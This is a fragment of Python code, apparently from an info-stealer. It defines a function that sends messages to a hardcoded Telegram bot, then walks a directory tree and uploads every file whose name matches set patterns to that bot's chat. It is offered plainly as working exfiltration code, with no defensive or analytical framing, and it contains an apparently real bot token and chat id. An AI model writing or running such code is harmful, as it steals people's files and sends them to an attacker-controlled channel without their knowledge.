...
def send_to_maharaja(message):
    url = f"https://api.telegram.org/bot{7656919186:AAEt13Ih65Oq3SgzmJk6i-fzVEbRQDbjI9A}/sendMessage"
    requests.post(url, data={'chat_id': 6885264796, 'text': message})
    ...
    for root, dirs, files in os.walk(base_path):
        for file in files:
            if any(re.search(p, file, re.I) for p in patterns):
                ...
                file_url = f"https://api.telegram.org/bot{7656919186:AAEt13Ih65Oq3SgzmJk6i-fzVEbRQDbjI9A}/sendDocument"
                with open(os.path.join(root, file), 'rb') as f:
                    requests.post(file_url, data={'chat_id': 6885264796}, files={'document': f})
